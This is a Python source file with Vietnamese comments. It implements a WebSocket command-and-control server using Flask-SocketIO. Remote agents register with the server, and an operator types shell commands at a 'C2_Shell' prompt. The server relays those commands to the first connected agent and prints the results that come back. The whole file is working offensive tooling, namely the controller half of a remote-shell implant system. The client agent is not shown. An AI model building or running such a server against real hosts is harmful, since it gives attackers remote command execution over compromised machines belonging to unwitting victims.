from flask import Flask, request
from flask_socketio import SocketIO, emit
import threading
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!' 
socketio = SocketIO(app)

# bo nho tam thoi (RAM)
# agents = { "uuid": { "info": {...}, "sid": "session_id_xyz" } }
agents = {}

@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid}")

@socketio.on('register')
def handle_register(data):
    # data là JSON do agent gui len: {"agent_id": "...", "hostname": "..."}
    agent_id = data.get('agent_id')
    
    if agent_id:
        # luu session id moi nhat de co the gui lenh nguoc lai (interactive shell)
        current_sid = request.sid
        
        # cap nhat thong tin vao bo nho
        agents[agent_id] = {
            "info": data,
            "sid": current_sid, 
            "status": "online"
        }
        
        print(f"[*] Agent Registered: {agent_id} | Host: {data.get('hostname')} | SID: {current_sid}")
        
        # gui tin hieu xac nhan cho agent: "ok, server da xac nhan"
        emit('server_ack', {'status': 'registered', 'message': 'Welcome to C2'})

# lang nghe de nhan command output tu agent
@socketio.on('command_result')
def handle_command_result(data):
    agent_id = data.get('agent_id')
    result = data.get('result')
    
    print(f"[*] received result from [{agent_id}]:")
    print(result)

def cmd_interface():
    while True:
        cmd = input("C2_Shell > ")
        if cmd == 'exit':
            break
            
        if agents:
            # lay id cua agent dau tien trong danh sach
            target_id = list(agents.keys())[0]
            
            # lay sid tuong ung tu dictionary agents
            target_sid = agents[target_id]["sid"]
            
            # gui lenh di voi tham so room
            socketio.emit('execute_command', {'cmd': cmd}, room=target_sid)
            print(f"[*] sent command to {target_id}")
        else:
            print("[!] no agents connected yet.")

if __name__ == '__main__':
    # khoi tao luong nhap lieu
    t = threading.Thread(target=cmd_interface)
    t.start()

    print("[*] Starting C2 Server with WebSockets...")
    socketio.run(app, port=80, debug=False)
    #debug=False de tranh xung dot voi thread input